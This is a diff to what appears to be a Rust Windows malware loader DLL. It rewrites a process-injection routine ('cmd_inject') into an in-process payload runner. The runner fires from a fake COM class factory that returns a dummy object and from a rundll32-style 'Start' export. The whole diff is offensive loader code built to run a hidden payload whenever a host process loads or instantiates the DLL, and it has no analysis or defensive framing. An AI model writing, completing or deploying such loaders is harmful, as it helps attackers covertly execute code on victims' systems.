@@ -4,8 +4,9 @@ use std::ffi::c_void;
 use windows_sys::core::{GUID, HRESULT};
 use windows_sys::Win32::Foundation::{CLASS_E_CLASSNOTAVAILABLE, E_NOINTERFACE, HWND, S_OK, HMODULE};
 use windows_sys::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
-use windows_sys::Win32::System::Threading::GetCurrentProcessId;
 
+#[path = "../resolve.rs"]
+mod resolve;
 mod commands {
     pub mod borrow {
         include!("../borrow.rs");
@@ -17,20 +18,19 @@ fn log(_msg: &str) {}
 
 static LOADER_ONCE: std::sync::Once = std::sync::Once::new();
 
-fn spawn_cmd_inject(target_pid: Option<u32>) {
-    std::thread::spawn(move || {
-        if let Err(e) = commands::borrow::cmd_inject(target_pid) {
-            let msg = format!("cmd_inject failed: {:?}", e);
+fn spawn_payload_runner() {
+    std::thread::spawn(|| {
+        if let Err(e) = commands::borrow::run_payload_in_process() {
+            let msg = format!("run_payload_in_process failed: {:?}", e);
             commands::borrow::log_debug(&msg);
         }
     });
 }
 
-fn run_cmd_inject_from_loader() {
+fn run_payload_from_loader() {
     LOADER_ONCE.call_once(|| {
-        let pid = unsafe { GetCurrentProcessId() };
-        if let Err(e) = commands::borrow::cmd_inject(Some(pid)) {
-            let msg = format!("cmd_inject failed: {:?}", e);
+        if let Err(e) = commands::borrow::run_payload_in_process() {
+            let msg = format!("run_payload_in_process failed: {:?}", e);
             commands::borrow::log_debug(&msg);
         }
     });
@@ -266,7 +266,7 @@ unsafe extern "system" fn Factory_CreateInstance(
         return CLASS_E_CLASSNOTAVAILABLE;
     }
 
-    spawn_cmd_inject(None);
+    spawn_payload_runner();
 
     *ppvObject = std::ptr::addr_of_mut!(DUMMY_INSTANCE) as *mut c_void;
     S_OK
@@ -334,7 +334,7 @@ pub extern "system" fn Start(
     _show: i32,
 ) {
     unsafe { commands::borrow::PAYLOAD_HMODULE = hinst; }
-    run_cmd_inject_from_loader();
+    run_payload_from_loader();
 }
 
 #[unsafe(no_mangle)]
